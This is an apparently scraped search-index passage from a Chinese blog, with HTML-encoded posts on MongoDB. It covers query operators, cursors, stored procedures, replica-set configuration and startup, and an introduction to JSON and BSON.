limit&#x5982;&#x679C;&#x9700;&#x8981;&#x9650;&#x5236;&#x7ED3;&#x679C;&#x96C6;&#x7684;&#x957F;&#x5EA6;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x8C03;&#x7528;limit&#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x662F;&#x5F3A;&#x70C8;&#x63A8;&#x8350;&#x89E3;&#x51B3;&#x6027;&#x80FD;&#x95EE;&#x9898;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x9650;&#x5236;&#x6761;&#x6570;&#x6765;&#x51CF;&#x5C11;&#x7F51;&#x7EDC;&#x4F20;&#x8F93;&#xFF0C;&#x4F8B;&#x5982;123456&gt; db.things.find().limit(4){ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mongo&quot; }{ &quot;_id&quot; : ObjectId(&quot;627e7e124b7e83be0e107f69&quot;), &quot;x&quot; : 3 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6a&quot;), &quot;x&quot; : 4, &quot;j&quot; : 1 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6b&quot;), &quot;x&quot; : 4, &quot;j&quot; : 2 }&gt; &#x4FEE;&#x6539;&#x8BB0;&#x5F55;&#x7528;&#x6570;&#x636E;&#x5E93;&#x7684;&#x63CF;&#x8FF0;&#x65B9;&#x5F0F;&#x5C31;&#x662F;&#xFF1A;&#x5C06;name&#x5B57;&#x6BB5;&#xFF0C;&#x503C;&#x4E3A;mongo&#x7684;&#x4E00;&#x6761;&#x5185;&#x5BB9;&#x4FEE;&#x6539;&#x4E3A;mongo_new&#xFF1A;12&gt; db.things.update({name:&quot;mongo&quot;},{$set:{name:&quot;mong_new&quot;}})WriteResult({ &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 }) &#x5220;&#x9664;&#x8BB0;&#x5F55;&#x5C06;&#x7528;&#x6237;name&#x662F;mong_new&#x7684;&#x8BB0;&#x5F55;&#x5220;&#x9664;:1234567&gt; printjson(db.things.findOne({name:&quot;mong_new&quot;})){ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mong_new&quot; }&gt; db.things.remove({name:&quot;mong_new&quot;})WriteResult({ &quot;nRemoved&quot; : 1 })&gt; db.things.findOne({name:&quot;mong_new&quot;})null &#x9AD8;&#x7EA7;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#x64CD;&#x4F5C;&#x7B26;&lt;&#x3001;&lt;=&#x3001;&gt;&#x3001;&gt;= 123456db.collection.find({&quot;fields&quot;: {$gt: value}})db.collection.find({&quot;fields&quot;: {$lt: value}})db.collection.find({&quot;fields&quot;: {$gte: value}})db.collection.find({&quot;fields&quot;: {$lge: value}})// &#x591A;&#x4E2A;&#x6761;&#x4EF6;db.collection.find({&quot;fields&quot;:{$gt:value1, $lt: value2}}); $exists &#x5224;&#x65AD;&#x5B57;&#x6BB5;&#x662F;&#x5426;&#x5B58;&#x5728; 12345//&#x67E5;&#x8BE2;&#x5B58;&#x5728;age&#x5B57;&#x6BB5;&#x7684;&#x8BB0;&#x5F55;db.c1.find({age:{$exists:true}})// &#x67E5;&#x8BE2;name&#x5B57;&#x6BB5;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x8BB0;&#x5F55;db.c2.find({name:{$exists:false}}) NULL &#x503C;&#x5904;&#x7406;12// &#x67E5;&#x8BE2;&#x8BB0;&#x5F55;&#x6392;&#x67E5;null&#x503C;db.c1.find({&quot;age&quot;:&quot;$in&quot;:[null],&quot;$exists&quot;:true}) $mod &#x53D6;&#x6A21;&#x8FD0;&#x7B97; 123456789101112// &#x67E5;&#x8BE2;age&#x5B57;&#x6BB5;&#xFF0C;&#x53D6;&#x6A21;6&#x7B49;&#x4E8E;1&#x7684;&#x6570;&#x636E;&gt; db.c2.find({age:{$mod:[6,1]}}){ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ab&quot;), &quot;name&quot; : &quot;user1&quot;, &quot;age&quot; : 19 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b1&quot;), &quot;name&quot; : &quot;user7&quot;, &quot;age&quot; : 25 }// &#x67E5;&#x8BE2;age&#x5B57;&#x6BB5;&#xFF0C;&#x53D6;&#x6A21;2&#x7B49;&#x4E8E;0&#x7684;&#x6570;&#x636E;&gt; db.c2.find({age:{$mod:[2,0]}}){ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ac&quot;), &quot;name&quot; : &quot;user2&quot;, &quot;age&quot; : 20 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ae&quot;), &quot;name&quot; : &quot;user4&quot;, &quot;age&quot; : 22 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b0&quot;), &quot;name&quot; : &quot;user6&quot;, &quot;age&quot; : 24 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b2&quot;), &quot;name&quot; : &quot;user8&quot;, &quot;age&quot; : 26 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b4&quot;), &quot;name&quot; : &quot;user10&quot;, &quot;age&quot; : 28 }&gt; $ne &#x4E0D;&#x7B49;&#x4E8E; 12345678910111213// &#x67E5;&#x8BE2;x&#x4E0D;&#x7B49;&#x4E8E;3&#x7684;&#x8BB0;&#x5F55;&gt; db.things.find({x:{$ne:3}}){ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6a&quot;), &quot;x&quot; : 4, &quot;j&quot; : 1 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6b&quot;), &quot;x&quot; : 4, &quot;j&quot; : 2 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6c&quot;), &quot;x&quot; : 4, &quot;j&quot; : 3 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6d&quot;), &quot;x&quot; : 4, &quot;j&quot; : 4 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6e&quot;), &quot;x&quot; : 4, &quot;j&quot; : 5 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6f&quot;), &quot;x&quot; : 4, &quot;j&quot; : 6 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f70&quot;), &quot;x&quot; : 4, &quot;j&quot; : 7 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f71&quot;), &quot;x&quot; : 4, &quot;j&quot; : 8 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f72&quot;), &quot;x&quot; : 4, &quot;j&quot; : 9 }{ &quot;_id&quot; : 3, &quot;name&quot; : &quot;Bill&quot;, &quot;age&quot; : 34 }&gt; $in &#x548C; $nin &#xFF0C;&#x5305;&#x542B;&#x548C;&#x4E0D;&#x5305;&#x542B;123&gt; db.c2.find({&quot;name&quot;:{&quot;$in&quot;:[20,21,22]}})&gt; db.c2.find({&quot;name&quot;:{&quot;$nin&quot;:[20]}}) count() &#x67E5;&#x8BE2;&#x8BB0;&#x5F55;&#x6761;&#x6570;1db.things.find().count() skip() &#x9650;&#x5236;&#x8FD4;&#x56DE;&#x8BB0;&#x5F55;&#x7684;&#x8D77;&#x70B9;12// &#x4ECE;&#x7B2C;31&#x6761;&#x8BB0;&#x5F55;&#x5F00;&#x59CB;&#xFF0C;&#x8FD4;&#x56DE;10&#x6761;&#x8BB0;&#x5F55;db.userProfile.find().skip(31).limit(10) &#x6392;&#x5E8F;&#x4EE5;&#x5E74;&#x9F84;&#x5347;&#x5E8F;ASC1db.c2.find().sort({age: 1}) &#x4EE5;&#x5E74;&#x9F84;&#x964D;&#x5E8F;DESC1db.c2.find().sort({age:-1}) &#x6E38;&#x6807;&#x50CF;&#x5927;&#x591A;&#x6570;&#x6570;&#x636E;&#x5E93;&#x4EA7;&#x54C1;&#x4E00;&#x6837;&#xFF0C;MongoDB&#x4E5F;&#x662F;&#x7528;&#x6E38;&#x6807;&#x6765;&#x5FAA;&#x73AF;&#x5904;&#x7406;&#x6BCF;&#x4E00;&#x6761;&#x7ED3;&#x679C;&#x6570;&#x636E;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105&gt; for(var c=db.c2.find();c.hasNext();){... printjson(c.next())}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ab&quot;), &quot;name&quot; : &quot;user1&quot;, &quot;age&quot; : 19}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ac&quot;), &quot;name&quot; : &quot;user2&quot;, &quot;age&quot; : 20}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ad&quot;), &quot;name&quot; : &quot;user3&quot;, &quot;age&quot; : 21}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ae&quot;), &quot;name&quot; : &quot;user4&quot;, &quot;age&quot; : 22}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97af&quot;), &quot;name&quot; : &quot;user5&quot;, &quot;age&quot; : 23}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b0&quot;), &quot;name&quot; : &quot;user6&quot;, &quot;age&quot; : 24}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b1&quot;), &quot;name&quot; : &quot;user7&quot;, &quot;age&quot; : 25}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b2&quot;), &quot;name&quot; : &quot;user8&quot;, &quot;age&quot; : 26}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b3&quot;), &quot;name&quot; : &quot;user9&quot;, &quot;age&quot; : 27}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b4&quot;), &quot;name&quot; : &quot;user10&quot;, &quot;age&quot; : 28}// &#x53E6;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&gt; db.c2.find().forEach(function(u){printjson(u)}){ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ab&quot;), &quot;name&quot; : &quot;user1&quot;, &quot;age&quot; : 19}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ac&quot;), &quot;name&quot; : &quot;user2&quot;, &quot;age&quot; : 20}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ad&quot;), &quot;name&quot; : &quot;user3&quot;, &quot;age&quot; : 21}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ae&quot;), &quot;name&quot; : &quot;user4&quot;, &quot;age&quot; : 22}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97af&quot;), &quot;name&quot; : &quot;user5&quot;, &quot;age&quot; : 23}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b0&quot;), &quot;name&quot; : &quot;user6&quot;, &quot;age&quot; : 24}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b1&quot;), &quot;name&quot; : &quot;user7&quot;, &quot;age&quot; : 25}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b2&quot;), &quot;name&quot; : &quot;user8&quot;, &quot;age&quot; : 26}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b3&quot;), &quot;name&quot; : &quot;user9&quot;, &quot;age&quot; : 27}{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b4&quot;), &quot;name&quot; : &quot;user10&quot;, &quot;age&quot; : 28}&gt; &#x5B58;&#x50A8;&#x8FC7;&#x7A0B;MongoDB&#x540C;&#x6837;&#x652F;&#x6301;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x3002;&#x5173;&#x4E8E;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x4F60;&#x9700;&#x8981;&#x77E5;&#x9053;&#x7684;&#x7B2C;&#x4E00;&#x4EF6;&#x4E8B;&#x5C31;&#x662F;&#x5B83;&#x662F;&#x7528;JavaScript&#x6765;&#x5199;&#x7684;&#x3002;MongoDB&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x662F;&#x5B58;&#x50A8;&#x5728;db.system.js&#x8868;&#x4E2D;&#x3002; MongoDB&#x7684;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x521B;&#x5EFA;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;123456789101112// &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&gt; db.system.save({_id:&quot;addNumbers&quot;,value:function(x,y){return x+y}})WriteResult({ &quot;nMatched&quot; : 0, &quot;nUpserted&quot; : 1, &quot;nModified&quot; : 0, &quot;_id&quot; : &quot;addNumbers&quot; })//&#x53EF;&#x4EE5;&#x4EE5;&#x4E0B;&#x65B9;&#x6CD5;&#x68C0;&#x67E5;&#x5B58;&#x50A8;&gt; db.system.js.find(){ &quot;_id&quot; : &quot;addNumbers&quot;, &quot;value&quot; : { &quot;code&quot; : &quot;function (x,y){return x+y}&quot; } }// &#x8C03;&#x7528;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&gt; db.eval(&apos;addNumber(3,4.2)&apos;)WARNING: db.eval is deprecated7.2 &#x53C2;&#x8003;&#xFF1A;https://www.mongodb.com/docs/v4.2/reference/method/js-collection/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"MongoDB安装部署","date":"2022-06-07T04:42:53.000Z","path":"/posts/55c06d78/","text":"MongoDB&#x5B89;&#x88C5;&#x90E8;&#x7F72;&#x5B98;&#x65B9;&#x6587;&#x6863; https://docs.mongodb.com/manual/ 1234567891011121314151617181920212223242526272829303132[root@server11 ~]&amp; cat &gt;/opt/mongo_cluster/mongo_28017/conf/mongo_28017.conf &lt;&lt;EOFsystemLog: destination: file logAppend: true path: /opt/mongo_cluster/mongo_28017/logs/mongodb.logstorage: journal: enabled: true dbPath: /data/mongo_cluster/mongo_28017 directoryPerDB: true wiredTiger: engineConfig: cacheSizeGB: 1 directoryForIndexes: true collectionConfig: blockCompressor: zlib indexConfig: prefixCompression: trueprocessManagement: fork: true pidFilePath: /opt/mongo_cluster/mongo_28017/pid/mongod.pidnet: port: 28017 bindIp: 127.0.0.1,192.168.10.11replication: oplogSizeMB: 1024 replSetName: dba666EOF 12345678910111213[root@rhel7 ~]&amp; mongod -f /opt/mongo_cluster/mongo_28017/conf/mongo_28017.confabout to fork child process, waiting until server is ready for connections.forked process: 2463child process started successfully, parent exiting[root@rhel7 ~]&amp; mongod -f /opt/mongo_cluster/mongo_28018/conf/mongo_28018.confabout to fork child process, waiting until server is ready for connections.forked process: 2492child process started successfully, parent exiting[root@rhel7 ~]&amp; mongod -f /opt/mongo_cluster/mongo_28019/conf/mongo_28019.confabout to fork child process, waiting until server is ready for connections.forked process: 2521child process started successfully, parent exiting[root@rhel7 ~]&amp; 12345[root@rhel7 ~]&amp; netstat -pantul |grep mongotcp 0 0 0.0.0.0:28017 0.0.0.0:* LISTEN 2463/mongodtcp 0 0 0.0.0.0:28018 0.0.0.0:* LISTEN 2492/mongodtcp 0 0 0.0.0.0:28019 0.0.0.0:* LISTEN 2521/mongodtcp 0 0 0.0.0.0:27017 0.0.0.0:* LISTEN 1410/mongod document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"MongoDB介绍","date":"2022-06-07T04:42:46.000Z","path":"/posts/8b1c1f4b/","text":"MongoDB&#x4ECB;&#x7ECD;Mongodb &#x7531; C++&#x8BED;&#x8A00;&#x7F16;&#x5199;&#x7684;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;&#x5206;&#x5E03;&#x5F0F;&#x6587;&#x4EF6;&#x5B58;&#x50A8;&#x7684;&#x5F00;&#x6E90;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x3002;&#xFF0C;&#x662F;&#x4E13;&#x4E3A;&#x53EF;&#x6269;&#x5C55;&#x6027;&#xFF0C;&#x9AD8;&#x6027;&#x80FD;&#x548C;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x800C;&#x8BBE;&#x8BA1;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C; &#x662F;&#x975E;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x529F;&#x80FD;&#x6700;&#x4E30;&#x5BCC;&#xFF0C;&#x6700;&#x50CF;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x7684;&#xFF0C;&#x5B83;&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x975E;&#x5E38;&#x6563;&#xFF0C;&#x662F;&#x7C7B;&#x4F3C; json &#x7684; bjson &#x683C;&#x5F0F;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x5B58;&#x50A8;&#x6BD4;&#x8F83;&#x590D;&#x6742;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x3002; MongoDB &#x7684;&#xFF08;&#x6765;&#x81EA;&#x4E8E;&#x82F1;&#x6587;&#x5355;&#x8BCD;&#x201C;&#x4E86; Humongous&#x201D;&#xFF0C;&#x4E2D;&#x6587;&#x542B;&#x4E49;&#x4E3A;&#x201C;&#x5E9E;&#x5927;&#x201D;&#xFF09;&#x662F;&#x53EF;&#x4EE5;&#x5E94;&#x7528;&#x4E8E;&#x5404;&#x79CD;&#x89C4;&#x6A21;&#x7684;&#x4F01;&#x4E1A;&#xFF0C;&#x5404;&#x4E2A;&#x884C;&#x4E1A;&#x4EE5;&#x53CA;&#x5404;&#x7C7B;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x5F00;&#x6E90;&#x6570;&#x636E;&#x5E93;&#x3002;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x9002;&#x7528;&#x4E8E;&#x654F;&#x6377;&#x5F00;&#x53D1;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;MongoDB&#x7684;&#x6570;&#x636E;&#x6A21;&#x5F0F;&#x53EF;&#x4EE5;&#x968F;&#x7740;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x53D1;&#x5C55;&#x800C;&#x7075;&#x6D3B;&#x5730;&#x66F4;&#x65B0;&#x3002;MongoDB &#x4EE5;&#x4E00;&#x79CD;&#x53EB;&#x505A; BSON&#xFF08;&#x4E8C;&#x8FDB;&#x5236; JSON&#xFF09;&#x7684;&#x5B58;&#x50A8;&#x5F62;&#x5F0F;&#x5C06;&#x6570;&#x636E;&#x4F5C;&#x4E3A;&#x6587;&#x6863;&#x5B58;&#x50A8;&#x3002;&#x5177;&#x6709;&#x76F8;&#x4F3C;&#x7ED3;&#x6784;&#x7684;&#x6587;&#x6863;&#x901A;&#x5E38;&#x88AB;&#x6574;&#x7406;&#x6210;&#x96C6;&#x5408;&#x3002;&#x53EF;&#x4EE5;&#x628A;&#x8FD9;&#x4E9B;&#x96C6;&#x5408;&#x770B;&#x6210;&#x7C7B;&#x4F3C;&#x4E8E;&#x5173;&#x7CFB;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x8868;&#xFF1A; &#x6587;&#x6863;&#x548C;&#x884C;&#x76F8;&#x4F3C;&#xFF0C; &#x5B57;&#x6BB5;&#x548C;&#x5217;&#x76F8;&#x4F3C;&#x3002; MongoDB&#x662F;&#x4E13;&#x4E3A;&#x53EF;&#x6269;&#x5C55;&#x6027;&#xFF0C;&#x9AD8;&#x6027;&#x80FD;&#x548C;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x800C;&#x8BBE;&#x8BA1;&#x7684;&#x6570;&#x636E;&#x5E93;&#x3002;&#x5B83;&#x53EF;&#x4EE5;&#x4ECE;&#x5355;&#x670D;&#x52A1;&#x5668;&#x90E8;&#x7F72;&#x6269;&#x5C55;&#x5230;&#x5927;&#x578B;&#x3001;&#x590D;&#x6742;&#x7684;&#x591A;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#x67B6;&#x6784;&#x3002;&#x5229;&#x7528;&#x5185;&#x5B58;&#x8BA1;&#x7B97;&#x7684;&#x4F18;&#x52BF;&#xFF0C;MongoDB&#x80FD;&#x591F;&#x63D0;&#x4F9B;&#x9AD8;&#x6027;&#x80FD;&#x7684;&#x6570;&#x636E;&#x8BFB;&#x5199;&#x64CD;&#x4F5C;&#x3002; MongoDB&#x7684;&#x672C;&#x5730;&#x590D;&#x5236;&#x548C;&#x81EA;&#x52A8;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#x529F;&#x80FD;&#x4F7F;&#x60A8;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5177;&#x6709;&#x4F01;&#x4E1A;&#x7EA7;&#x7684;&#x53EF;&#x9760;&#x6027;&#x548C;&#x64CD;&#x4F5C;&#x7075;&#x6D3B;&#x6027; 2.1 MongoDB &#x6570;&#x636E;&#x683C;&#x5F0F;2.1.1 JSONJSON(JavaScript Object Notation) &#x662F;&#x4E00;&#x79CD;&#x8F7B;&#x91CF;&#x7EA7;&#x7684;&#x6570;&#x636E;&#x4EA4;&#x6362;&#x683C;&#x5F0F;&#x3002;JSON &#x91C7;&#x7528;&#x5B8C;&#x5168;&#x72EC;&#x7ACB;&#x4E8E;&#x8BED;&#x8A00;&#x7684;&#x6587;&#x672C;&#x683C;&#x5F0F;&#xFF0C;&#x4F46;&#x662F;&#x4E5F;&#x4F7F;&#x7528;&#x4E86;&#x7C7B;&#x4F3C;&#x4E8E; C &#x8BED;&#x8A00;&#x5BB6;&#x65CF;&#x7684;&#x4E60;&#x60EF;&#xFF08;&#x5305;&#x62EC; C&#x3001; C++&#x3001; C#&#x3001; Java&#x3001;JavaScript&#x3001; Perl&#x3001;Python &#x7B49;&#xFF09;&#x3002;&#x8FD9;&#x4E9B;&#x7279;&#x6027;&#x4F7F; JSON &#x6210;&#x4E3A;&#x7406;&#x60F3;&#x7684;&#x6570;&#x636E;&#x4EA4;&#x6362;&#x8BED;&#x8A00;.&#x6613;&#x4E8E;&#x4EBA;&#x9605;&#x8BFB;&#x548C;&#x7F16;&#x5199;&#xFF0C;&#x540C;&#x65F6;&#x4E5F;&#x6613;&#x4E8E;&#x673A;&#x5668;&#x89E3;&#x6790;&#x548C;&#x751F;&#x6210;(&#x4E00;&#x822C;&#x7528;&#x4E8E;&#x63D0;&#x5347;&#x7F51;&#x7EDC;&#x4F20;&#x8F93;&#x901F;&#x7387;)&#x3002;JSON &#x7684;&#x5B98;&#x65B9; MIME &#x7C7B;&#x578B;&#x662F; application/json,&#x6587;&#x4EF6;&#x6269;&#x5C55;&#x540D;&#x662F;.json&#x3002; MongoDB &#x4F7F;&#x7528; JSON&#xFF08;JavaScript ObjectNotation&#xFF09;&#x6587;&#x6863;&#x5B58;&#x50A8;&#x8BB0;&#x5F55;&#x3002;JSON &#x7B80;&#x5355;&#x8BF4;&#x5C31;&#x662F; JavaScript &#x4E2D;&#x7684;&#x5BF9;&#x8C61;&#x548C;&#x6570;&#x7EC4;&#xFF0C;&#x901A;&#x8FC7;&#x5BF9;&#x8C61;&#x548C;&#x6570;&#x7EC4;&#x53EF;&#x4EE5;&#x8868;&#x793A;&#x5404;&#x79CD;&#x590D;&#x6742;&#x7684;&#x7ED3;&#x6784;&#x3002; &#x5BF9;&#x8C61;&#xFF1A;&#x5BF9;&#x8C61;&#x5728; js &#x4E2D;&#x8868;&#x793A;&#x4E3A;&#x201C;{}&#x201D;&#x62EC;&#x8D77;&#x6765;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x4E3A; {key&#xFF1A; value,key&#xFF1A; value,&#x2026;}&#x7684;&#x952E;&#x503C;&#x5BF9;&#x7684;&#x7ED3;&#x6784;&#xFF0C;&#x5728;&#x9762;&#x5411;&#x5BF9;&#x8C61;&#x7684;&#x8BED;&#x8A00;&#x4E2D;&#xFF0C; key &#x4E3A;&#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#xFF0C; value &#x4E3A;&#x5BF9;&#x5E94;&#x7684;&#x5C5E;&#x6027;&#x503C;&#xFF0C;&#x6240;&#x4EE5;&#x5F88;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#xFF0C;&#x53D6;&#x503C;&#x65B9;&#x6CD5;&#x4E3A; &#x5BF9;&#x8C61;.key &#x83B7;&#x53D6;&#x5C5E;&#x6027;&#x503C;&#xFF0C;&#x8FD9;&#x4E2A;&#x5C5E;&#x6027;&#x503C;&#x7684;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x662F; &#x6570;&#x5B57;&#x3001;&#x5B57;&#x7B26;&#x4E32;&#x3001;&#x6570;&#x7EC4;&#x3001;&#x5BF9;&#x8C61;&#x51E0;&#x79CD;&#x3002;&#x4F8B;&#x5982;&#xFF1A; {&#x201C;FirstName&#x201D;:&#x201D;ke&#x201D;,&#x201D;LastName&#x201D;:&#x201D;me&#x201D;,&#x201D;email&#x201D;:&#x201D;hikeme@aa&#x201D;}&#x53D6;&#x503C;&#x65B9;&#x5F0F;&#x548C;&#x6240;&#x6709;&#x8BED;&#x8A00;&#x4E2D;&#x4E00;&#x6837;,&#x4F7F;&#x7528; key &#x83B7;&#x53D6;,&#x5B57;&#x6BB5;&#x503C;&#x7684;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x662F; &#x6570;&#x5B57;&#x3001;&#x5B57;&#x7B26;&#x4E32;&#x3001;&#x6570;&#x7EC4;&#x3001;&#x5BF9;&#x8C61;&#x51E0;&#x79CD;&#x3002; 2.1.2 BSONBSON &#x662F;&#x4E00;&#x79CD;&#x7C7B; JSON &#x7684;&#x4E00;&#x79CD;&#x4E8C;&#x8FDB;&#x5236;&#x5F62;&#x5F0F;&#x7684;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#xFF0C;&#x7B80;&#x79F0; Binary JSON&#xFF0C;&#x5B83;&#x548C; JSON &#x4E00;&#x6837;&#xFF0C;&#x652F;&#x6301;&#x5185;&#x5D4C;&#x7684;&#x6587;&#x6863;&#x5BF9;&#x8C61;&#x548C;&#x6570;&#x7EC4;&#x5BF9;&#x8C61;&#xFF0C;&#x4F46;&#x662F; BSON &#x6709; JSON &#x6CA1;&#x6709;&#x7684;&#x4E00;&#x4E9B;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x5982; Date &#x548C; BinData &#x7C7B;&#x578B;&#x3002; &#x5B83;&#x7684;&#x4F18;&#x70B9;&#x662F;&#x7075;&#x6D3B;&#x6027;&#x9AD8;&#xFF0C;&#x4F46;&#x5B83;&#x7684;&#x7F3A;&#x70B9;&#x662F;&#x7A7A;&#x95F4;&#x5229;&#x7528;&#x7387;&#x4E0D;&#x662F;&#x5F88;&#x7406;&#x60F3;&#x3002;BSON &#x6709;&#x4E09;&#x4E2A;&#x7279;&#x70B9;&#xFF1A;&#x8F7B;&#x91CF;&#x6027;&#x3001;&#x53EF;&#x904D;&#x5386;&#x6027;&#x3001;&#x9AD8;&#x6548;&#x6027;&#x3002;&#x5BF9;JSON &#x6765;&#x8BF4;&#xFF0C;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x662F;&#x65E0;&#x7C7B;&#x578B;&#x7684;&#xFF0C;&#x6BD4;&#x5982;&#x4F60;&#x8981;&#x4FEE;&#x6539;&#x57FA;&#x672C;&#x4E00;&#x4E2A;&#x503C;&#xFF0C;&#x4ECE; 9 &#x5230; 10&#xFF0C;&#x7531;&#x4E8E;&#x4ECE;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x53D8;&#x6210;&#x4E86;&#x4E24;&#x4E2A;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x80FD;&#x5176;&#x540E;&#x9762;&#x7684;&#x6240;&#x6709;&#x5185;&#x5BB9;&#x90FD;&#x9700;&#x8981;&#x5F80;&#x540E;&#x79FB;&#x4E00;&#x4F4D;&#x624D;&#x53EF;&#x4EE5;&#x3002;&#x800C;&#x4F7F;&#x7528; BSON&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x8FD9;&#x4E2A;&#x5217;&#x4E3A;&#x6570;&#x5B57;&#x5217;&#xFF0C;&#x90A3;&#x4E48;&#x65E0;&#x8BBA;&#x6570;&#x5B57;&#x4ECE; 9 &#x957F;&#x5230; 10 &#x8FD8;&#x662F; 